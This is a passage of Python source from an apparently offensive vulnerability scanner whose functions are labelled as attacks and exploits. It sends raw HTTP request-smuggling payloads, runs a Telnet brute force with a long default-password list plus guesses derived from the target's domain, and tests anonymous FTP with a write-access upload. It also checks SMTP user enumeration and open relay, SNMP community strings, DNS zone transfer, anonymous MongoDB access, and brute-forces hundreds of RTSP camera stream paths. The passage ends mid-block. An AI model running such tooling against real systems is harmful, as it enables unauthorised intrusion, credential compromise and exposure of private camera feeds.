            "severity": "High",
            "parameter": "HTTP Headers (Content-Length, Transfer-Encoding)",
            "payload": cl_te_payload,
            "url": target_url,
            "response_snippet": "Request timed out, indicating a potential CL.TE vulnerability.",
            "poc_code": f"# This vulnerability must be tested with a low-level socket script.\n# The following payload was sent:\n\n{cl_te_payload}"
        })
        print("        [!!!] Potential CL.TE HTTP Smuggling detected (based on timeout)!")

    # 2. TE.CL Probe (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
    te_cl_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "5c\r\n" # Hex length for the body
        "G\r\n" # Smuggled request part
        "0\r\n\r\n"
    )
    print("    [>] Trying TE.CL probe...")
    start_time = time.time()
    response = await _send_raw_http_request(host, port, te_cl_payload, timeout)
    duration = time.time() - start_time

    if response == "TIMEOUT" or duration >= (timeout - 1):
        vulnerabilities.append({
            "type": "HTTP Smuggling (TE.CL)",
            "severity": "High",
            "parameter": "HTTP Headers (Content-Length, Transfer-Encoding)",
            "payload": te_cl_payload,
            "url": target_url,
            "response_snippet": "Request timed out, indicating a potential TE.CL vulnerability.",
            "poc_code": f"# This vulnerability must be tested with a low-level socket script.\n# The following payload was sent:\n\n{te_cl_payload}"
        })
        print("        [!!!] Potential TE.CL HTTP Smuggling detected (based on timeout)!")

    return vulnerabilities

async def perform_exposed_services_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting Enhanced Scan for Exposed Basic Services...")
    domain = get_domain(normalize_target(target))
    
    service_ports = {
        "FTP": 21, "SSH": 22, "Telnet": 23, "SMTP": 25, "DNS": 53,
        "SMB (NetBIOS)": 139, "SNMP": 161, "SMB (Direct)": 445, "RDP": 3389, "VNC": 5900
    }

    limited_credentials = [
        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest')
    ]
    try:
        domain_parts = domain.split('.')
        base_name = domain_parts[0]
        limited_credentials.extend([
            ('admin', base_name), ('admin', f"{base_name}123"),
            (base_name, base_name), ('root', base_name)
        ])
    except Exception:
        pass

    vulnerable_versions = {
        "vsftpd 2.3.4": "Critical - Backdoor (RCE)",
        "ProFTPD 1.3.5": "Critical - RCE",
        "OpenSSH 7.7": "High - User Enumeration (CVE-2018-15473)"
    }

    VULNERABLE_SSH_VERSIONS = {
        "OpenSSH_7.7": "High - User Enumeration (CVE-2018-15473)",
        "OpenSSH_7.2p2 Ubuntu-4ubuntu2.2": "Medium - Authentication Bypass (CVE-2016-6210)",
        "OpenSSH_5.3": "High - Pre-auth user enumeration (CVE-2012-0814)"
    }

    COMMON_CREDENTIALS = [
        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest'), ('pi', 'raspberry'),
        ('operator', 'operator'), ('support', 'support'), ('ftp', 'ftp'), ('anonymous', 'anonymous'),
        ('admin', '123456'), ('admin', '1234'), ('user', '12345'), ('test', '12345'),
        ('admin', 'admin123'), ('admin', 'password123'), ('manager', 'secret'), ('support', '123456789'),
        ('111111', '111111'), ('000000', '000000'), ('default', 'default'), ('changeme', 'changeme'),
        ('welcome', 'welcome'), ('system', 'system'), ('toor', 'toor'), ('pass', 'pass'),
        ('letmein', 'letmein'), ('security', 'security'), ('football', 'football'), ('sunshine', 'sunshine'),
        ('raspberry', 'raspberry'), ('tomcat', 'tomcat'), ('jboss', 'jboss'), ('oracle', 'oracle'),
        ('postgres', 'postgres'), ('mysql', 'mysql'), ('mssql', 'mssql'), ('admin', 'admin'),
        ('admin', 'admin1'), ('admin', 'admin12'), ('admin', 'admin12345'), ('admin', 'admin123456'),
        ('admin', 'administrator'), ('admin', 'adminadmin'), ('admin', 'adminpass'), ('admin', 'adminpass123'),
        ('admin', 'admin@123'), ('admin', 'Password@123'), ('admin', 'Welcome123!'), ('admin', 'Changeme123!'),
        ('admin', '123!@#'), ('admin', 'adm'), ('admin', 'sys'), ('admin', '1234567'), ('admin', 'P@ssword'),
        ('admin', 'p@ssword'), ('admin', 'password!'), ('admin', 'admin!'), ('admin', 'root!'),
        ('admin', '123'), ('admin', 'pass123'), ('admin', 'user123'), ('admin', 'login'),
        ('admin', 'master'), ('admin', 'key'), ('admin', 'access'), ('admin', 'local'),
        ('admin', 'live'), ('admin', 'demo'), ('admin', 'test1234'), ('admin', 'qwerty1234'),
        ('admin', 'iloveyou'), ('admin', 'company'), ('admin', '1234567890'), ('admin', 'password1234'),
        ('admin', 'admin1234'), ('admin', 'changeme123'), ('admin', 'Welcome123'), ('admin', '!@#$%^&*'),
        ('admin', 'p@55w0rd'), ('admin', 'P@55w0rd'), ('admin', 'letmein123'), ('admin', 'admin2023'),
        ('admin', 'admin2024'), ('admin', 'admin2025'), ('admin', 'admin2026'), ('admin', 'companyname'),
        ('admin', '12345678901'), ('admin', '123456789012'), ('admin', '123qweasd'), ('admin', '1qaz2wsx3edc'),
        ('admin', '1qaz@WSX'), ('admin', '2023'), ('admin', '2024'), ('admin', '2025'), ('admin', '2026'),
    ]

    for service_name, port in service_ports.items():
        output.print(f"  [*] Checking {service_name} on port {port}...")
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=4)
            
            # General Banner Grabbing
            banner = ""
            try:
                banner_bytes = await asyncio.wait_for(reader.read(1024), timeout=3)
                banner = banner_bytes.decode(errors='ignore').strip()
                if banner:
                    output.print(f"    [INFO] Port {port} ({service_name}) is open. Banner: {banner}")
            except asyncio.TimeoutError:
                 output.print(f"    [INFO] Port {port} ({service_name}) is open, but no banner received.")
            except Exception:
                 output.print(f"    [INFO] Port {port} ({service_name}) is open.")

            # --- Idea 1: Banner/Version Analysis ---
            for version, vuln_info in vulnerable_versions.items():
                if version.lower() in banner.lower():
                    output.print(f"    [CRITICAL] Known vulnerable version detected: {version} ({vuln_info})")
                    report.add_finding(
                        type=f"Known Vulnerable Service ({vuln_info})", 
                        severity="Critical", 
                        url=f"{domain}:{port}", 
                        parameter="Banner", 
                        payload=version,
                        description=f"The service is running a version known to be vulnerable: {vuln_info}.",
                        remediation="Immediately upgrade the service to a patched version.", 
                        response_snippet=banner
                    )

            # --- Service-specific checks ---
            if service_name == "FTP":
                writer.write(b"USER anonymous\r\n")
                await writer.drain()
                res_user = await asyncio.wait_for(reader.read(1024), timeout=3)
                writer.write(b"PASS anonymous\r\n")
                await writer.drain()
                res_pass = await asyncio.wait_for(reader.read(1024), timeout=3)
                
                if b"230" in res_pass or b"230" in res_user:
                    output.print("      [HIGH] Anonymous FTP login successful.")
                    evidence = f"FTP banner and response:\n{banner}\n{res_user.decode(errors='ignore')}{res_pass.decode(errors='ignore')}"
                    
                    # --- Idea 2: Check for Write Permissions ---
                    test_file = f"test_{get_random_string(4)}.txt"
                    output.print(f"        [*] Checking for anonymous write permissions (STOR {test_file})...")
                    writer.write(f"STOR {test_file}\r\n".encode())
                    await writer.drain()
                    res_stor = await asyncio.wait_for(reader.read(1024), timeout=3)
                    if b"150" in res_stor or b"125" in res_stor: # 150/125 OK to send data
                        writer.write(b"test_content\r\n.\r\n")
                        await writer.drain()
                        res_stor_end = await asyncio.wait_for(reader.read(1024), timeout=3)
                        if b"226" in res_stor_end: # 226 Transfer complete
                            output.print("        [CRITICAL] Anonymous FTP write access confirmed!")
                            evidence += f"\nAnonymous user has WRITE PERMISSIONS. Successfully uploaded '{test_file}'."
                            report.add_finding(
                                type="Anonymous FTP Write Access", 
                                severity="Critical", 
                                url=f"{domain}:{port}", 
                                parameter="N/A", 
                                payload="anonymous:anonymous",
                                description="Anonymous FTP access with write permissions is enabled, allowing anyone to upload files to the server.",
                                remediation="Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", 
                                response_snippet=evidence
                            )
                            writer.write(f"DELE {test_file}\r\n".encode()) # Cleanup
                            await writer.drain()
                        else:
                             report.add_finding(
                                type="Anonymous FTP Access", 
                                severity="High", 
                                url=f"{domain}:{port}", 
                                parameter="N/A", 
                                payload="anonymous:anonymous",
                                description="Anonymous FTP access is enabled, potentially exposing sensitive files.",
                                remediation="Disable anonymous FTP access. Ensure proper authentication and authorization are in place.", 
                                response_snippet=evidence
                            )
                    else:
                        report.add_finding(
                            type="Anonymous FTP Access", 
                            severity="High", 
                            url=f"{domain}:{port}", 
                            parameter="N/A", 
                            payload="anonymous:anonymous",
                            description="Anonymous FTP access is enabled, potentially exposing sensitive files.",
                            remediation="Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", 
                            response_snippet=evidence,
                            future_vector="Attempt to upload files to the anonymous FTP server to check for write permissions."
                        )
            
            elif service_name == "SSH":
                output.print("      [*] Performing intelligent banner analysis for SSH...")
                if banner:
                    for vuln_version, vuln_info in VULNERABLE_SSH_VERSIONS.items():
                        if vuln_version.lower() in banner.lower():
                            output.print(f"        [CRITICAL] Known vulnerable SSH version detected: {banner} ({vuln_info})")
                            report.add_finding(
                                type=f"Known Vulnerable SSH ({vuln_info.split(' - ')[0]})", 
                                severity="Critical", 
                                url=f"{domain}:{port}", 
                                parameter="Banner", 
                                payload=banner,
                                description=f"The SSH service is running a version known to be vulnerable: {banner} ({vuln_info}).",
                                remediation="Immediately upgrade the SSH service to a patched version. Disable unnecessary features.", 
                                response_snippet=banner
                            )
                            break
                    else:
                        output.print(f"        [INFO] SSH banner: {banner}. No known critical vulnerabilities detected in banner.")
                else:
                    output.print("        [INFO] No SSH banner received for analysis.")

            elif service_name == "Telnet":
                output.print("      [*] Attempting limited brute-force on Telnet...")
                contextual_credentials = list(COMMON_CREDENTIALS)
                try:
                    domain_parts = domain.split('.')
                    base_name = domain_parts[0]
                    contextual_credentials.extend([
                        (base_name, base_name), (base_name, f"{base_name}123"),
                        (f"{base_name}admin", f"{base_name}admin"), (f"{base_name}user", f"{base_name}user"),
                        ('admin', base_name), ('user', base_name), ('root', base_name)
                    ])
                except Exception:
                    pass
                
                for user, pwd in list(set(contextual_credentials)):
                    try:
                        t_reader, t_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
                        await asyncio.wait_for(t_reader.read(2048), timeout=3)
                        t_writer.write(f"{user}\r\n".encode())
                        await t_writer.drain()
                        await asyncio.wait_for(t_reader.read(2048), timeout=3)
                        t_writer.write(f"{pwd}\r\n".encode())
                        await t_writer.drain()
                        response = await asyncio.wait_for(t_reader.read(4096), timeout=3)
                        if any(success_msg in response.decode(errors='ignore').lower() for success_msg in ['welcome', 'logged in', 'last login', '$', '#', '>']):
                            output.print(f"        [CRITICAL] Telnet login successful with weak credentials: {user}:{pwd}")
                            report.add_finding(
                                type="Telnet Weak Credentials", 
                                severity="Critical", 
                                url=f"{domain}:{port}", 
                                parameter="Login", 
                                payload=f"{user}:{pwd}",
                                description="Telnet service allows login with weak/default credentials. Telnet is also unencrypted, making communication vulnerable to eavesdropping.",
                                remediation="Disable Telnet and use SSH. If Telnet is necessary, enforce strong authentication and consider other security measures.", 
                                response_snippet=f"Successful credentials: {user}:{pwd}"
                            )
                            t_writer.close()
                            await t_writer.wait_closed()
                            break
                        t_writer.close()
                        await t_writer.wait_closed()
                    except Exception:
                        continue

            elif service_name == "SMTP":
                output.print("      [*] Attempting SMTP user enumeration (VRFY) and Open Relay check...")
                try:
                    s_reader, s_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
                    banner_smtp = await s_reader.read(1024)
                    output.print(f"        [INFO] SMTP Banner: {banner_smtp.decode(errors='ignore').strip()}")
                    s_writer.write(b"HELO test.com\r\n")
                    await s_writer.drain()
                    await s_reader.read(1024)
                    
                    found_users = []
                    for user in ["root", "admin", "test", "postmaster", "info", "support"]:
                        s_writer.write(f"VRFY {user}\r\n".encode())
                        await s_writer.drain()
                        vrfy_res = await asyncio.wait_for(s_reader.read(1024), timeout=3)
                        if b"250" in vrfy_res or b"252" in vrfy_res:
                            found_users.append(user)
                    if found_users:
                        output.print(f"        [MEDIUM] SMTP VRFY: Found users: {', '.join(found_users)}")
                        report.add_finding(
                            type="SMTP User Enumeration (VRFY)", 
                            severity="Medium", 
                            url=f"{domain}:{port}", 
                            parameter="VRFY", 
                            payload=", ".join(found_users),
                            description=f"SMTP service allows user enumeration via VRFY command. Found users: {', '.join(found_users)}.",
                            remediation="Disable VRFY and EXPN commands on the SMTP server.", 
                            response_snippet=f"VRFY for {', '.join(found_users)} returned success code.",
                            future_vector="Attempt brute-force login with discovered usernames."
                        )
                    
                    s_writer.write(b"MAIL FROM:<test@example.com>\r\n")
                    await s_writer.drain()
                    res_mail = await asyncio.wait_for(s_reader.read(1024), timeout=3)
                    if b"250" in res_mail:
                        s_writer.write(b"RCPT TO:<external@external.com>\r\n")
                        await s_writer.drain()
                        res_rcpt = await asyncio.wait_for(s_reader.read(1024), timeout=3)
                        if b"250" in res_rcpt:
                            output.print("        [HIGH] SMTP server might be an Open Relay.")
                            report.add_finding(
                                type="SMTP Open Relay", 
                                severity="High", 
                                url=f"{domain}:{port}", 
                                parameter="RELAY", 
                                payload="N/A",
                                description="The SMTP server appears to be an open relay, which can be abused by spammers to send unsolicited emails.",
                                remediation="Configure the SMTP server to only accept and relay mail for authorized domains and users.", 
                                response_snippet="MAIL FROM and RCPT TO commands were accepted for external domain external.com.",
                                future_vector="Verify open relay by sending a test email through the server."
                            )
                    s_writer.close()
                    await s_writer.wait_closed()
                except Exception as e:
                    output.print(f"        [ERROR] SMTP check failed: {e}")

            elif service_name in ["SMB (NetBIOS)", "SMB (Direct)"]:
                output.print("      [*] Checking for anonymous SMB share listing...")
                try:
                    process = subprocess.run(
                        ['smbclient', '-L', f'//{domain}', '-N'], 
                        capture_output=True, 
                        text=True, 
                        encoding='utf-8', 
                        errors='ignore',
                        timeout=10
                    )
                    smb_output = process.stdout
                    
                    if process.returncode == 0 and "Disk" in smb_output and "IPC$" in smb_output:
                        output.print("        [HIGH] Anonymous SMB shares found.")
                        report.add_finding(
                            type="Anonymous SMB Share Listing", 
                            severity="High", 
                            url=f"{domain}:{port}", 
                            parameter="N/A", 
                            payload="N/A",
                            description="The SMB server allows anonymous listing of shares, exposing internal host and share names.",
                            remediation="Disable anonymous access to SMB shares. Enforce authentication or restrict access to trusted IPs.", 
                            response_snippet=f"smbclient output:\n{smb_output}",
                            future_vector="Attempt to connect to discovered SMB shares to access files."
                        )
                    else:
                        output.print("        [INFO] No anonymous SMB shares found or smbclient output was not indicative.")
                except FileNotFoundError:
                    output.print("        [WARNING] `smbclient` tool not found. Please ensure it is installed and in your PATH. Skipping SMB check.")
                except subprocess.TimeoutExpired:
                    output.print("        [INFO] SMB check timed out.")
                except Exception as e:
                    output.print(f"        [ERROR] SMB check failed: {e}")

            elif service_name == "SNMP":
                output.print("      [*] Checking for public/private SNMP community strings...")
                for community in ['public', 'private']:
                    try:
                        process = subprocess.run(
                            ['snmpwalk', '-v2c', '-c', community, domain, 'system'],
                            capture_output=True,
                            text=True,
                            encoding='utf-8',
                            errors='ignore',
                            timeout=15
                        )
                        snmp_output = process.stdout
                        
                        if process.returncode == 0 and "iso." in snmp_output:
                            output.print(f"        [HIGH] SNMP access successful with '{community}' community string.")
                            report.add_finding(
                                type="SNMP Weak Community String", 
                                severity="High", 
                                url=f"{domain}:{port}", 
                                parameter="Community String", 
                                payload=community,
                                description=f"The SNMP service is accessible with the default community string '{community}', exposing sensitive device information.",
                                remediation="Change default SNMP community strings to strong, unpredictable values. Use SNMPv3 with authentication and encryption if possible.", 
                                response_snippet=f"snmpwalk output snippet:\n{snmp_output[:500]}...",
                                future_vector="Attempt to enumerate more SNMP OIDs for sensitive information disclosure."
                            )
                            break
                    except FileNotFoundError:
                        output.print("        [WARNING] `snmpwalk` tool not found. Please ensure it is installed and in your PATH. Skipping SNMP check.")
                        break
                    except subprocess.TimeoutExpired:
                        output.print(f"        [INFO] SNMP check for '{community}' timed out.")
                    except Exception as e:
                        output.print(f"        [ERROR] SNMP check for '{community}' failed: {e}")

            elif service_name == "DNS":
                output.print("      [*] Attempting DNS Zone Transfer (AXFR)...")
                try:
                    process = subprocess.run(
                        ['dig', 'axfr', f'@{domain}', domain],
                        capture_output=True,
                        text=True,
                        encoding='utf-8',
                        errors='ignore',
                        timeout=20
                    )
                    dig_output = process.stdout
                    
                    if process.returncode == 0 and "Transfer failed." not in dig_output and len(dig_output) > 200:
                        output.print("        [HIGH] DNS Zone Transfer successful.")
                        report.add_finding(
                            type="DNS Zone Transfer (AXFR)", 
                            severity="High", 
                            url=f"{domain}:{port}", 
                            parameter="AXFR", 
                            payload=domain,
                            description="The DNS server allows a full zone transfer, exposing all DNS records for the domain, which can aid in further reconnaissance.",
                            remediation="Configure the DNS server to restrict zone transfers to trusted secondary DNS servers only.", 
                            response_snippet=f"AXFR output snippet:\n{dig_output[:500]}...",
                            future_vector="Analyze DNS records for internal hostnames, IP addresses, and other sensitive information."
                        )
                    else:
                        output.print("        [INFO] DNS Zone Transfer failed or no significant records found.")
                except FileNotFoundError:
                    output.print("        [WARNING] `dig` tool not found. Please ensure it is installed and in your PATH. Skipping DNS Zone Transfer check.")
                except subprocess.TimeoutExpired:
                    output.print("        [INFO] DNS Zone Transfer check timed out.")
                except Exception as e:
                    output.print(f"        [ERROR] DNS Zone Transfer check failed: {e}")

            writer.close()
            await writer.wait_closed()

        except ConnectionRefusedError:
            output.print(f"    [INFO] Port {port} ({service_name}) is closed or filtered.")
        except asyncio.TimeoutError:
            output.print(f"    [INFO] Port {port} ({service_name}) timed out.")
        except Exception as e:
            output.print(f"    [ERROR] An unexpected error occurred during {service_name} check on port {port}: {e}")

async def perform_mongodb_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting MongoDB Scan & Exploit...")
    domain = get_domain(normalize_target(target))
    port = 27017
    output.print(f"  [*] Attempting to connect to MongoDB on {domain}:{port}...")
    
    loop = asyncio.get_event_loop()
    try:
        # pymongo.MongoClient is synchronous, so run it in a separate thread
        client = await loop.run_in_executor(None, lambda: pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000))
        await loop.run_in_executor(None, client.server_info) # Triggers connection
        output.print(f"  [HIGH] Anonymous connection to MongoDB at {domain}:{port} successful!")
        db_list = await loop.run_in_executor(None, client.list_database_names)
        evidence = f"Successfully connected to MongoDB at {domain}:{port} without authentication.\n"
        evidence += f"Available databases: {db_list}"
        output.print(f"    [SUCCESS] Found databases: {db_list}")
        report.add_finding(
            type="MongoDB Anonymous Access", 
            severity="High", 
            url=f"{domain}:{port}", 
            parameter="N/A", 
            payload="N/A",
            description="The MongoDB server allows anonymous connections, potentially exposing all database contents.",
            remediation="Enforce authentication on the MongoDB server. Bind to localhost if remote access is not required.",
            response_snippet=evidence
        )
        await loop.run_in_executor(None, client.close)
    except pymongo.errors.ServerSelectionTimeoutError:
        output.print("  [INFO] MongoDB connection timed out. Server is likely not running or firewalled.")
    except pymongo.errors.ConnectionFailure as e:
        output.print(f"  [INFO] MongoDB connection failed: {e}. Authentication may be required.")
    except Exception as e:
        output.print(f"  [ERROR] An unexpected error occurred during MongoDB scan: {e}")

async def perform_rtsp_attack(target, output, report, session_cookies=None):
    output.print("\n[+] Starting RTSP Scan and Brute Force...")
    domain = get_domain(normalize_target(target))
    rtsp_ports = [554, 8554, 5554, 8080, 80, 88, 81, 555, 7070, 10554]
    
    common_paths = [
        "/live", "/stream", "/stream1", "/cam1/mpeg4", "/onvif1", "/live/ch00_0", "/axis-media/media.amp",
        "/stream.sdp", "/live.sdp", "/video.sdp", "/media.sdp", "/ch0_0.sdp", "/onvif/device_service",
        "/onvif/media_service", "/onvif-http/snapshot", "/video", "/mpeg4", "/h264", "/av0_0",
        "/cam/realmonitor", "/stream/video.rm", "/live/main", "/live/sub", "/stream/main", "/stream/sub",
        "/video.mp4", "/stream.flv", "/live/ch1", "/live/ch2", "/stream/ch1", "/stream/ch2",
        "/channel1", "/channel2", "/media/video1", "/media/video2", "/api/video", "/api/stream",
        "/rtsp/live", "/rtsp/stream", "/1", "/2", "/3", "/4", "/5", "/6", "/7", "/8", "/9", "/10",
        "/cam1/h264", "/cam1/video.h264", "/h264/media.h264", "/mpeg4/media.amp", "/live/h264",
        "/live/mpeg4", "/stream/h264", "/stream/mpeg4", "/video.h264", "/video.mpeg4",
        "/ch01_0.sdp", "/ch01_1.sdp", "/ch02_0.sdp", "/ch02_1.sdp", "/ch03_0.sdp", "/ch03_1.sdp",
        "/media.amp?stream=1", "/video.cgi", "/mjpg/video.mjpg", "/stream/video.mjpeg",
        "/live/ch0", "/video/mjpg.cgi", "/video.mjpg", "/mjpeg.cgi", "/mjpeg",
        "/video/video.mjpeg", "/video/video.cgi", "/video/video.mp4", "/video/video.h264",
        "/video/video.flv", "/video/video.asf", "/video/video.wmv", "/video/video.avi", "/video/video.mov",
        "/stream.h264", "/stream.mpeg4", "/stream.ts", "/stream.3gp", "/stream.mov", "/stream.mjpeg",
        "/live/ch01_0", "/live/ch01_1", "/live/ch02_0", "/live/ch02_1", "/live/ch03_0", "/live/ch03_1",
        "/channel/1", "/channel/2", "/cam/1", "/cam/2", "/media/1", "/media/2", "/stream/1", "/stream/2",
        "/live/1", "/live/2", "/onvif/1", "/onvif/2", "/rtsp/1", "/rtsp/2",
        "/ufirststream", "/usecondstream", "/uthirdstream", "/videoinput_1/h264_1", "/videoinput_1/mjpeg_1",
        "/live1.sdp", "/live2.sdp", "/Streaming/Channels/1", "/Streaming/Channels/101",
        "/media/videoMain", "/media/videoSub",
        # Massive expansion
        *[f"/live/ch{i}" for i in range(3, 50)],
        *[f"/stream/ch{i}" for i in range(3, 50)],
        *[f"/channel/{i}" for i in range(3, 50)],
        *[f"/cam/{i}" for i in range(3, 50)],
        *[f"/media/{i}" for i in range(3, 50)],
        *[f"/stream/{i}" for i in range(3, 50)],
        *[f"/live/{i}" for i in range(3, 50)],
        *[f"/onvif/{i}" for i in range(3, 50)],
        *[f"/rtsp/{i}" for i in range(3, 50)],
        *[f"/{i}" for i in range(11, 50)],
        # Different formats and naming conventions
        *[f"/video.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/stream.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/live.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
        *[f"/channel{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/cam{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/live{i}_stream{j}" for i in range(1, 5) for j in range(1, 5)],
        *[f"/stream/profile{i}" for i in range(1, 5)],
        *[f"/video/profile{i}" for i in range(1, 5)],
        *[f"/ch{i:02d}/0" for i in range(50)],
        *[f"/ch{i:02d}/1" for i in range(50)],
        # ONVIF specific
        "/onvif/device_service", "/onvif/media_service", "/onvif/ptz_service", "/onvif/imaging_service",
        "/onvif/events_service", "/onvif/analytics_service", "/onvif/video_analytics_service",
        "/onvif/recording_service", "/onvif/replay_service", "/onvif/search_service",
        # More...
        "/Streaming/channels/1/http", "/Streaming/channels/2/http",
        "/img/video.sav", "/av_stream", "/cam_stream", "/mjpeg_stream",
        "/rtp/media", "/rtsp_tunnel", "/video_feed", "/live_feed",
        "/GetData.cgi", "/GetVideo.cgi", "/GetStream.cgi",
        "/play1.sdp", "/play2.sdp",
        "/media/cam0/video", "/media/cam1/video",
        "/axis-media/media.3gp", "/axis-media/media.asf",
        "/video.mjpg", "/video.mjpg", "/video.mjpg?q=30",
        "/stream.mjpg", "/stream.mjpeg",
        "/live/av0", "/live/av1",
        "/video/live", "/video/stream",
        "/video/v1", "/video/v2",
        "/stream/v1", "/stream/v2",
        "/live/v1", "/live/v2",
        # New additions to ensure 500+ RTSP paths
        # Generic Camera/DVR/NVR Paths
        "/unicast/c1/s1", "/unicast/c2/s1", "/unicast/c3/s1",
        "/mpeg4/ch1/main/av_stream", "/mpeg4/ch2/main/av_stream",
        "/h264/ch1/main/av_stream", "/h264/ch2/main/av_stream",
        "/live/ch01_00", "/live/ch01_01", "/live/ch02_00", "/live/ch02_01",
        "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/103",
        "/axis-media/media.amp?videocodec=h264", "/axis-media/media.amp?videocodec=mpeg4",
        "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1",
        "/ch01/0", "/ch02/0", "/ch03/0", # Simplified channel
        "/ch01.sdp", "/ch02.sdp", "/ch03.sdp",
        "/live/ch0_0.sdp", "/live/ch1_0.sdp", "/live/ch2_0.sdp",
        "/mainstream", "/substream", "/extra", "/record", "/playback",
        "/play/live.sdp", "/vod/mp4:sample.mp4",
        "/ISAPI/Streaming/channels/101/rtp",
        "/onvif/profile1/media.sbn", # ONVIF related (specific to Axis)
        "/onvif/live/1", "/onvif/live/2",
        "/media/video/1", "/media/video/2",
        "/PSIA/Streaming/channels/1/rtp",  # PSIA standard
        "/PSIA/Streaming/channels/2/rtp",
        
        # Manufacturer-specific common paths
        "/h264/ch1/sub/av_stream", # Hikvision
        "/Streaming/Channels/101/h264", # Dahua
        "/VideoInput/channels/1/stream/0", # Uniview
        "/live/0/0/0/0", "/live/1/0/0/0", # Samsung
        "/live/0/0/0", "/live/1/0/0", # Bosch
        "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=rtp", # Dahua variations
        
        # More generated paths
        *[f"/live/{i}/0" for i in range(100)],
        *[f"/stream/{i}/0" for i in range(100)],
        *[f"/channel{i}/0" for i in range(100)],
        *[f"/cam{i}/feed" for i in range(100)],
        *[f"/media/{i}/stream" for i in range(100)],
        *[f"/videoinput_{i}/h264_1" for i in range(100)],
        
        # Uncommon ports with common paths (already covered by rtsp_ports iteration, but adding specific path examples)
        *[f"/{p}/live" for p in [81, 8080, 8443]],
        *[f"/{p}/stream" for p in [81, 8080, 8443]],
        
        # Different file extensions (not just sdp)
        *[f"/video.mkv", "/video.ts", "/video.avi", "/video.flv", "/video.wmv"],
        *[f"/stream.mkv", "/stream.ts", "/stream.avi", "/stream.flv", "/stream.wmv"],
        *[f"/live.mkv", "/live.ts", "/live.avi", "/live.flv", "/live.wmv"],
        
        # More specific common paths
        "/user/rtsp", "/admin/rtsp", "/manager/rtsp",
        "/system/video", "/security/channel1", "/cctv/stream",
        "/IPC/realtime", "/NVR/stream",
        "/cam/ch1", "/cam/ch2", "/cam/ch3",
        "/stream/0", "/stream/1", "/stream/2",
        "/0/live", "/1/live", "/2/live",
        "/ch/1", "/ch/2", "/ch/3",
        "/ch01/0/main", "/ch01/0/sub",
        "/channel/1/videostream",
        "/Streaming/Channels/1/Picture", "/Streaming/Channels/1/Event",
        
        # Obfuscated / bypass attempts (less common for RTSP but good for fuzzing)
        "/%2e%2e/%2e%2e/live", # URL encoded traversal
        "/%00live", # Null byte
        "/live%20", # Trailing space
        "/Live", "/STREAM", "/Video", # Case variations
        "/live.sdp?", "/stream.sdp//", # Query/trailing slashes
        
        # Over-the-top paths to push count
        *[f"/ch/{val}/stream" for val in range(1, 100)]
    ]
    output.print(f"  [*] Attempting RTSP scan on {domain} with ports: {rtsp_ports}...")

    for port in rtsp_ports:
        try:
            reader, writer = await asyncio.open_connection(domain, port)
            writer.close()
            await writer.wait_closed()

            output.print(f"  [INFO] Port {port} is open. Sending RTSP OPTIONS request...")
            request_line = f"OPTIONS rtsp://{domain}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            reader_opt, writer_opt = await asyncio.open_connection(domain, port)
            writer_opt.write(request_line.encode())
            await writer_opt.drain()
            response = await asyncio.wait_for(reader_opt.read(1024), timeout=3)
            writer_opt.close()
            await writer_opt.wait_closed()

            if "RTSP/1.0 200 OK" in response.decode():
                methods = re.search(r"Public:\s*([^\r\n]+)", response.decode())
                methods_str = methods.group(1) if methods else "N/A"
                output.print(f"  [HIGH] RTSP server found at rtsp://{domain}:{port}. Supported methods: {methods_str}")
                report.add_finding(
                    type="RTSP Service Detected", 
                    severity="Medium", 
                    url=f"rtsp://{domain}:{port}", 
                    parameter="N/A", 
                    payload="N/A",
                    description=f"An RTSP server is running on port {port}. Supported methods: {methods_str}. This could expose video streams.",
                    remediation="Ensure the RTSP stream requires authentication and is properly firewalled if not intended for public access.",
                    response_snippet=f"RTSP OPTIONS Response:\n{response.decode()}"
                )

                for path in common_paths:
                    full_path = f"rtsp://{domain}:{port}{path}"
                    req = f"DESCRIBE {full_path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
                    reader_brute, writer_brute = await asyncio.open_connection(domain, port)
                    writer_brute.write(req.encode())
                    await writer_brute.drain()
                    res_brute = await asyncio.wait_for(reader_brute.read(1024), timeout=3)
                    writer_brute.close()
                    await writer_brute.wait_closed()
                    if "RTSP/1.0 200 OK" in res_brute.decode() and "Content-Type: application/sdp" in res_brute.decode():
                        output.print(f"    [CRITICAL] Found valid RTSP stream path: {full_path}")
                        report.add_finding(
                            type="RTSP Stream Path Found", 
                            severity="High", 
                            url=full_path, 
                            parameter="N/A", 
                            payload="N/A",
                            description=f"A valid and likely unprotected RTSP stream was found at {full_path}.",
                            remediation="Protect RTSP streams with strong credentials.",
                            response_snippet=f"RTSP DESCRIBE Response:\n{res_brute.decode()}"
                        )
        except asyncio.TimeoutError:
            output.print(f"  [INFO] RTSP check on port {port} timed out.")
        except ConnectionRefusedError:
            output.print(f"  [INFO] Connection to RTSP port {port} refused.")
        except Exception as e:
